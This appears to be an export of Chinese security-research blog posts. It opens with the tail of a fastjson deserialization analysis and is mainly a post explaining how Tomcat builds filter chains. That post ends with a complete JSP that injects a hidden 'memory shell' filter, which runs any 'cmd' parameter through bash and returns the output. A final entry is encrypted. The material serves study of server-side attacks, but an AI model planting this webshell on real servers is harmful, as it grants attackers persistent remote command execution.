<span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    <span class="type">AtomicBoolean</span> <span class="variable">atomic</span> <span class="operator">=</span> (AtomicBoolean) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="literal">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(fieldInfo.fieldClass)) &#123;</span><br><span class="line">                    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="literal">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="type">Collection</span> <span class="variable">collection</span> <span class="operator">=</span> (Collection) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="literal">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (field != <span class="literal">null</span>) &#123;</span><br><span class="line">                    field.set(object, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;set property error, &quot;</span> + fieldInfo.name, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>大致的思路就是看之前的fieldInfo中是否有method，在No7中有相关的操作，如果有就会去invoke。<br>所以如果有相关的getXxx方法或者setXxx想去调用，那在反序列化的时候必须把相关的Xxx变量加到json数据中，这样才会有相应的变量封装到fieldDeserializer（No8步骤），之后才会在setValue的时候去调用对应的getXxx或者setXxx方法</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>大致思路就是如此，光听文章分析能学到的东西是很有限的，最后还是需要自己动手去调试。</p>
<p>在写这篇文章之前也不知道一些绕过方法，只是分析了一下fastjson的原理，后面看到网上的那些方法，没想到我竟然凑巧把这些绕过payload自己搞出来了，还是有点小高兴。所以说知道原理还是很重要的。<br>在下一篇就研究一下fastjson的反序列化利用，和一些绕过payload</p>
]]></content>
      <categories>
        <category>fastjson</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Filter内存马</title>
    <url>/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对Filter内存马原理的简单分析<br><span id="more"></span></p>
<h2 id="Filter注册流程"><a href="#Filter注册流程" class="headerlink" title="Filter注册流程"></a>Filter注册流程</h2><p>用一张图来描述一下tomcat的基本加载流程<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg" alt><br>可以看到FilterChain是在WrapperValue容器中调用的<br>而FilterChain，顾名思义，就是一个Filter的链，从第一个Filter一直传到最后一个Filter，然后才调用Servlet</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>首先调试Filter内存马需要先在pom.xml加<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.67<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这里的version我选得是和我tomcat的版本一样，不知道有没有联系<br><strong>不加次依赖是无法调试的</strong></p>
<p>先写一个简单的Filter容器<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(urlPatterns = &quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterA</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;a: before&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">        pw.write(<span class="string">&quot;aaaaaaaaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        System.out.println(<span class="string">&quot;a: after&quot;</span>);</span><br><span class="line"></span><br><span class="line">        pw.write(<span class="string">&quot;&lt;br&gt;back&quot;</span>);</span><br><span class="line">        pw.flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在doFilter第一行代码下断点，根据调用栈可以看到WrapperValue容器<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/2.jpg" alt></p>
<p>进入WrapperValue，往上翻找可以看到filterChain的来源，在此处下断点，重新调试<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/3.jpg" alt></p>
<p>进入createFilterChain，注意到这一行代码，可以看到这里面有我们的Filter链，是一个Map，另外一条应该是tomcat自带的filter，这行就是从context对象中获取现有的Filter链<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/4.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/5.jpg" alt></p>
<p>往下到了一个循环处，是根据上面得到的filterMap，去依次从context中取出filterConfig<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/6.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/7.jpg" alt></p>
<p>获取到filterConfig后就会将filterConfig加入filterChain中，该filterChain对象中的filters列表会添加filterConfig<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/8.jpg" alt></p>
<p>创建完FilterChain后，来到filterChain的doFilter方法<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/9.jpg" alt></p>
<p>跟着调试，会进入internalDofilter方法，n是Filter个数，pos是当前是第几个Filter<br>首先会取出当前的filterConfig，并通过getFilter函数，从filterConfig取出filter对象<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/10.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/11.jpg" alt></p>
<p>最后拿到filter对象了，通过doFilter调用具体的Filter，也就是我们写的那个demo<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/12.jpg" alt><br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/13.jpg" alt></p>
<p>那么该调用过程就分析的差不多了</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul>
<li>先从context中获取filterMaps</li>
<li>根据filterMaps从context中取出filterConfig</li>
<li>将filterConfig加入filterChain中，filterChain中的filters成员变量会添加filterConfig</li>
<li>调用doFilter</li>
</ul>
<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p>通过上面的分析，我们知道如果想将木马注册到filter中，那么就需要context对象的两个参数</p>
<ul>
<li>filterMaps</li>
<li>filterConfigs</li>
</ul>
<p>在他们两个Map中添加相应的filter就行了</p>
<p>但是，当我们去看filterConfigs相应的构造函数代码，会发现需要传递 Context和filterDef，且并不带有public，那么就需要通过反射获取<br><img src="/2022/12/05/Filter%E5%86%85%E5%AD%98%E9%A9%AC/14.jpg" alt></p>
<p>context就是上面分析的那个context<br>所以最后需要三个参数，具体如何生成可以看相应的构造函数</p>
<ul>
<li>filterMaps</li>
<li>filterConfigs</li>
<li>filterDef</li>
</ul>
<p>那么最终的代码如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;abcd&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name)==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filterDef添加到filterDefs中</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><ul>
<li><a href="https://xz.aliyun.com/t/10362">https://xz.aliyun.com/t/10362</a></li>
</ul>
]]></content>
      <categories>
        <category>内存马</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>java</tag>
        <tag>内存马</tag>
      </tags>
  </entry>
  <entry>
    <title>buu刷题(1)</title>
    <url>/2022/12/04/buu%E5%88%B7%E9%A2%98-1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误" data-whm="加密无法验证">
  <script id="hbeData" type="hbeData" data-hmacdigest="941071248fd19cc97be93fda44a72c67642ab6f36c8a8389ce321e0a098a30f6">997c39fd209fc88ff14214af16a192b2c0d0a378e6a90d93e73b2a42d40bfff4e41adebf5542ca7a94e3c7327072ef795c6c08f7b554ef99503e7c2dd0025c6f777abba86e3193d7c38c33f3a424e702b0dabdc08d2dd4a2a688d3acb3e06d6c721381500e8471a4bf8c6c39e82f831de40b573075097e56dbb9b94f6bc05e62432ba59f041d89d5aa22f3f536594dbe0691723257ac713ef27acf11fed6458cc17aa55e67abd4f0396b5ff7dca378c040410e8023fa9eba9accf02d2c23ab714323b90a33254125022a9dd31ac09d88bf5c778557ff7a2b1cf9e05cfe1a1248aae9f617f08b6acd21a8b8222f7d7a7faccab0e6851427bc9de65121b4d2660cee7d409059986b2ab51fba2c97cae72e72e0901489f07ffa551b1e14e70d7102f0db999eb86dab7e48e73fceb9d9f9856f65eab8362b57e17ce73ded1ec71344e3c9e32c9749a15903cc168ef11f9ddd86da62916653c90a4cb36250c3adb3270429fda496e7690fc522eabddb9b92d63a9242125512b3ecde36ec62b7a63f90b7543043256340e8b128d39b5a3c263d7926db076ff98d2b6714c4a6fc059220f68303daee13e7736182e1d19f7f55dfecd9cdc0383c8e8857c3ad39eb5fb179353efdd4e5d6499190de947192e75253a025c57397a816b782477449eaa693b34c6f707f1de3f5964281164bcb20e416bbe2cf415b278b336847803b9ed8cb24387dfb868668b29decb14c96d1f96f35d000e11afa1d2c41905843f1245e6bbdbd9e71eef9cc2472b3ad00c49923a41d46dd0d046c15f31e54fcf16a12ceff58d7dc09451fe797e3f6e9f7eec6cd1d757d86f32a376673ecfaf44aad972e8115ba21c3c91ae2ac973c6bfcba667dc593262d87cecd9179bf307b11629564f228eb0e7e559f78b9e2e6b5fd8ea3b0657684e8875dfba46999510672d5b38510e5efca587e869337866ecd2513c1216642eccc69359d9f2fe27f08789e049b777a9f8ea9d02ba212427bf00622e8aff7451713b5103a05f0282eb397e1e4b7fd7e5b35d6dfa83b63c36f262f58a707d217c3b0fe665c170dc8d4529b67e9faa9fa73c10ea270654c4cef48534208589ed2898c3457d364658715bb902568eefb06b419545c2f161bebb865c22ca95ffa821fa1b3fad6af5e658ad9c47156fd601af58868cb8d002529347f4086cc263dac5177d06fdca78a4bc759851d82044906a308c1264c5c4c37e11af0055291a37d63c2f454504f75074cc5e50414c348cbc7eecfe16ff74c1c3d216a41cefe5396b2589512d31438671d18ee57dc70990d007b439fb8db70f1d3d5609f79d079be11487ea6d5c448e04f1a02fb23f9dcc6625a73eeecdb60f813d0be83e9f21ecd44bb3d0569e2a484dff1ad7085f02cd21bae6f9fc1301f0a9742c2e2dac0f944a79e5605a4bc75688fb9fc60c54dcb3b711b399ddfc2880443c1bbfc42fc6f439c623ffbf0f598b9caac42ee4bafb93a7553a1e3593063cbedb4665b0696bd1b429b9fdb615e263933c6add25b9ad35434cea14f0f8b929549277f8b6e87cb00535d2e7290cc53135a877e17eaebf96b7e23be856d8aea7ae76db609ccc7eb279174b8a90403a4d2a804286529f0bf93f7f561e03b8b38467eedbc1bc940d02ded058fe26f810eb702c49133b4f27ef2dd74142bbaaa4fbb57eefb6637f47dc7c32ae432f7abdd71f0208714eb5426c2429b0f70e8150732ebd613dcfe1d23e17067178edad1b798eb3549392b0c8fbf18fe3e62c0f884c1ad8ee2a9393bf117499698fe19db32944d0b997d0325ad2620eb6f394726ac8d650b93d16e8c70ec1a0f993cf552a70940ca4e275c76d0a6016a8b1d7a7632f856e70ac806f22c4e7eb79e69181eeb08cc33dd0590313f9183a566099612949ea840d1c6c33b07951b4ba61e5ec9074a0c40e62238c3b3f396e3fe2d93ea18fc9df230a0d731bcab636d0a6758e33c19487ed6529419fa982a81f2133aed3de3c6d3af6a280b55031bfc8d1f9fc7e944062a860598fbaa79ab4b102ad690fc1741d54129fe5ac3442056ef4f5972bac2c9e0aa78e75242fb499fda9512a66f75baecbe203f4baaafcdf5205a4ddcb9ec9c41a72a51d1883a4c0d03b279dfeeba210d4420c4932dccaf84a2b6131182151d7ec43b926c28986a159f8a15035e39dfee619d9f904c5cafdea8a43b368360db7edd7275abf0939b484f3b8f5daccc70d5c8b4f8818d723557eb7cc5b3fb02efe31385f496d79c440d0336f99e02217f55ec149183395f4e77a2b910875c74ffd9e781807e78db16b7f79b144018351a364096d67db1b36aaf2a4cf72ae56519e52effb0a3f64ce212e9ebfdebc513fed6f940bf4184c61c64fc67b5c54fd3fca5b896e55896879b927169190c201ac56f284e1ae740108564783efb69d25f5bf057a2c70c86266bd1b679d9efed7f83a79a0228751243dc12324c41384afd30345e95fe2dba2232ffb7beb38e9d35147504a554104bafc7cd7a314ffd64f70a80a0e0560247e33469bca6867ce79d49387d95844b141838a1c06970e1cf26ebcee76909458cb43d998b07821b8276d7174a9aed62a05dcff0fe7490018f7b56d5548f256d7c63c57871a5130fd65888d1f0c640a5984ebbaca7f15658fe73d92388d0e52e155fd65841c19823cc31d57db83382fe46519b5c73b4670778248fc01953e3ffdb61386e140a29fb8f9e353fe98ec4d90d0a3bee889ff9caffefdeb8c93458abd6ce00be24ee507677b0b508492ae4b098f7c25f2eaf07e1853fa5e8506893e60c53d08f31b114c1dcdb1debca0c8f10f8e57249ba7edec0355f6718f1d5f880d51cf7888edbb77658642b611dbda6b3546de66ef6b29b5af94e0ada7bba8a97e34ad846f580a2c0b5a4d082242e16447100ab56a38482388ce882a737ad862c0c8b701eefe5ba5e24d52806aa8698cdd61678a90d4a2c3f43135436aa3c5ec64a47882e27ef97dea0e9598ce1587ea1b70664978f50f9f7ade61c8172d598dc8ad19834cb478c0c88fcd5534303a828131f26d44d812dc326b469167eb5ec4d860eed6736935d3c06efae3d7725b3c4fa39385fe2f273adf3afa7101c25e0858fb335f40e84749dec92c0b9b04fd26c8b7e5f98352aae7701931399e2b4bcf3af5347167e20cf91711c4240e352bc93d592cc5b1667cf421f8d0ec6b1481dd8382da15376afab4c0fdbcda51e681e91e967f079635368c478bd972b0f9b05c39731728c15ab982e4df754477f12830a84bb40626d4ab904395dc4f6f4fe2799c6af7d43a20927970a8ca87029dd82f1a8e0140ec47c4416bc3e5c311db0cbec39b98352559c64aa02678a452c28034f63821bc699152a02a343df47f37b52a1d1d39f9cb4e601a8fab04ad1729a79e4c12a71bb78d4dcb3526be453d6fe6fe6337bc17487dc3ff282079d0065f0a478f9c0e89a5209a76ac601b7e833d9fa86c56af43a830d2a07bfaad066634a215ed5ae3e65e735c17efd62f9c57320bc26f2e95567f2d2802fd0e296dc7e81556550c27734f7ec5fe8568b6153f745948dd4e658f07df8e85211e2bc7d4b9709f02b25ad075d9cf421990328ab87e6e4ba644d56240e51f48dcf22cf70da15e8af0f21c7863618a78a7999920bc6370e0320c6650f872a11a7de933ca6ea9d429d5b0896154e42844710e694ed18aa38ca82624773796023032b2eaf8061747ff301f6e132efbad66e1ca4fd823e1be786bbd63fb8fa7ebd4e40a065fa8ba47497e9cc575a4228d3037c9c6914832a61bd24ff1cbe2af06fc921cbd5f3b1fe8db1f5759742282b3841ea27e2e912c126552e3b08ff38453d8a7a63814415aa9ba68a6c8f42b4cce058643c61c1575775128e3b28a943d9ec31f699fe201cb928b59ddddc65e2070d9490742494f28f9d4999d489b5df46e0399cd03d824b810c2c0195fd20586b6c178c665dae5996f646694429a389b36b9a774ba89540f188e78f8398d2d3897cb8b9e7a829f40ffd07fdfc33dfcf32bc59b25aadec4ed923b07968d029328258f7b30a12318a759ffdb97c2bf28b7764a397d01aa910cf8facbe70fc216c1a3cdfdc0a627749117a86df11e610898f898ad9f5ab44d30d85d350e5687d6adfbbf509b8c9707dea3e73b3e812df96f3b4737176727263fc7d8ef43ff5ae19fd08749673a0e20106a2744ca7383ca1db02561d95637dcb96aaf1b91f637bb80e59ccfe3661db8a470dd5bd4ab8317fc5154fd2b515509c00fd9147693a38d33c6c0becb0350c2e7842393b65df5553d459a81ae2a89edeb7c7c6ea3f69dd3e2d8123546acf1e2265e69057667d8f8ad36ec9b9bfd332e80af8d90c64deced1981480ecb1ba50a9d36d58f952b480640fc508432ee1c0f683442fc4303a45f3184d486dffa71ab4af32ddb375dd2761f082a2289e10554ca45e7ff8eaa54aa4d308cf995b74ebf5be8dc6d0efdab214535ea7585cab8abc9634125fe7048e2930271916a033d7db6de8ef923fcb905388af18f50cfdbda8fd5901d49a1a6c30e379160be4fe39e85ddf5b8fc9cc58d10595a29dd20210640ccaa5feff173fbfdec79901b1de0b0d8f622684227fb0f9da65c3a4bbad1b8bec94de3b9b2fda751e3cee5b30b0e3f3ddc244ec90e105264e7c70f702a54d013b4b2fdbd82bed5305b0d2983801dcc2739d4c74663b745130c3ec5099fd7117473e4466d16dd94c57d5b3d342aec51c365e14474b197509de9348cdd89efd62daf669239e84cd443296450ca63fddcafe865fe83c0b9d45e740b8cd7c461cbc614793753a6b25b8227aa3f359142daca0d3b5b6b5cdf10f2b3eed354e33e9eb777f0119916381e5b6c89d4fa9ba75a6d8ca0136108ed9224f62fbc8e6382d629e79d78497d0a5d00f2bff15972515bf8d11a6b5ecbd4e43a66e31cf3eea9e3b44ed81060d58e0634b473b136aefa8b19fd8f6ef8adc824a86d26c0536fdfaa62bb25dde5124c4313002552fb9075844376e701499c57d3120cc5ab6e32059bdefe351cf851c231920867e18dfe67c935bca86f44b25526ac46b0310b6406efc0b42c8f15ece3442c91a56481e14d8cd493b907022833d022e7b5e0d739d8b493bffb433d83913ec77d8984e26b704501a1ad01037240eb43fc30fc1a1b0e8da94777ab9a18998df9167f689a231dbbc34cddb1aecb8b574dd252824455497d69e3c33bec2787bdc86b80453ca2b884767b873164d0dee65149dada85d229d3057f3bb01ffaefbd92e280cc8c91c3bfd3ca8a84d57b5ae01f4d3f6c30659842b417f1c5c2f16281f6ac5101b325c74d7ea10193c3976826d93a35d62a0b49b7451371a3431656b5fe100718fa252890d241dde40a0142ab8f0b57b7c1fb58b69e99eb65aba3cf6f540566a1d26a9b34921f4588a92476cab84138d370e2c03195d48919081c560ffec89ae8812d4235ea1a147c6fa94209da097bbeef27a04e5d872a9f2946932743da9ec3f3b00d1fec60c4a5dc79b2c1cf90b9e871a441a8e62750239ea0f2e97463a44feaa7d7409d715d515590195251d032e2094f7ac30a1357f1f71c9fa910419b6dc993fd1b2f4ededcf96151e827d0c7be5f7cdfd8f715e3d5a898f5aff1b0a785b40c946613e30e1f9dae281376a134d95bd715889df12759a38af5d0c70e7fe15be902f5935bcc888f3448236958252c976bce4d800cba0230e9435202c9b176747f3ff3690c8729ec2abf81f358975b6185c40177fd8ebc95689c3010392dd242022f7afa0594c0916877e91df2952c829509127a116517e607069b3d6c3f05443cd8461a4b546764f55bb7e75ccfe5dfd0346b0e9b6b51496c7cb6836cc435b9071d72f72ca4ae5ddbc3ae6a2298d1037b2d0728c146e99b8aac9820ac7e831368fe971e0f64e3e54acacd66817c7d6f0b1fcda7dbfafe9f39273e635cc72345fb3cdef89cd14bee3133beadbe329d05db7e4058a8b554d00ccf91c34badee2f3f48371476125dc66c7e430a2a6cde9adb7841bb82dd02240762d59e20b50067a0f0006c15d95db42ce487ad01cab7e727bb356934598e3826dedbc8319ac9729a8dfaf7ac9d2e9df9cfef6c9d4a78d689ff254f81677e76c60714283684fff37d58febe8c84871a9f74885938479c325b0e21a8cba7c82fd4149cfbed6ae0f3f9050e782b7bf43f9a1eb478927fe2b2d9e9206f376e420fe5779dad7d8f2c916a8647b2f1ee753b5511ec513b8b76e4e30e5a6ce106e354dd3b85b80708f99b32b02fc452d4ba78623ce9b5c0a5ee063ec9dcb59eb09bf1300ae6a5430d11ac399b166d1b378381e89f931616d2533384e9529d4e51017cc138e25cec4b956449f40e3c099542f1c6e79c7753d18655c778c75b2e0a6b024e7c0ea54a35e7b5dce10e9cecb1073d422ae776ffcbbcf22d30699d5e8c4748745d09c1696ca61e8c179d43c655dfe61c398d01310e9a84c3d7e4e64c339de67b685f10e8a84fc3355b8e074b63d966fd95a8dd1237e10721634795adc1b0b2d75569f61126c2babaec8ec05d14fdee67eacd5695147c7378574325c4ae98ffd16fe53b29f405c08f66c6abd48f79195e9327ec0aca0c22d7ede8f275fcf2f33552fafe574f265bd4010434817b06d7ac9566503302d5879aa7850f9d4798164d63b314cb60a6c1e2abbf732c4f0fd13f464bd279cf6667b9c4967c038b52c93ba927b48386673ed9a2a